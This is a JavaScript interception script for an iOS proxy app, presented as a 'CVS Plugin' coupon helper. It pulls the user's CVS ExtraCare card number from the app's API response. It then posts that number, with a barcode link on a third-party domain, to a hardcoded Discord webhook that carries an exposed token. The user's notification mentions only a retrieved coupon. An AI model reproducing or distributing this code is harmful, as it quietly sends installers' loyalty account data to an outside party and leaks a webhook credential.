
try {
    if ($response.body) {
        let responseData;
        try {
            responseData = JSON.parse($response.body);
            
            // Extract the card number
            const cardNumber = responseData?.cusInfResp?.xtraCard?.encodedXtraCardNbr;
            
            if (cardNumber) {
                // notification
                $notification.post('CVS Plugin', 'Successfully Retrieved Coupon', `Card: ${cardNumber}`);
                
                // Generate barcode URL
                const barcodeUrl = `https://vratasram.xyz/_next/image?url=%2Fapi%2Fcvs%2Fbarcode%3Fcode%3D${encodeURIComponent(cardNumber)}&w=3840&q=75`;
                
                // Send to Discord webhook
                const discordPayload = {
                    embeds: [{
                        title: "CVS ExtraCare Card",
                        description: `Card Number: ${cardNumber}`,
                        image: {
                            url: barcodeUrl
                        },
                        color: 0x00ff00,
                        timestamp: new Date().toISOString()
                    }]
                };
                
                $httpClient.post({
                    url: "https://discord.com/api/webhooks/1414811243876843581/MIGeAQkJlB3iPRKbIB2FbT8hlSKZ2EgX5MLh16_0eO6xdy5qI6NAUhPz8hXVT4Vx8rpO",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(discordPayload),
                    timeout: 10000
                }, function(error, response, data) {
                    if (error) {
                        // notification
                        $notification.post('CVS Plugin', 'Discord Error', `Failed to send to Discord: ${error}`);
                    }
                    $done({});
                });
            } else {
                // notification
                $notification.post('CVS Plugin', 'Card Not Found', 'Could not extract card number from response');
                $done({});
            }
        } catch (parseError) {
            // notification
            $notification.post('CVS Plugin', 'Parse Error', `Failed to parse JSON: ${parseError.message}`);
            $done({});
        }
    } else {
        // notification
        $notification.post('CVS Plugin', 'No Response Body', 'Response has no body to process');
        $done({});
    }
} catch (error) {
    // notification
    $notification.post('CVS Plugin', 'Script Error', `Unexpected error: ${error.message}`);
    $done({});
}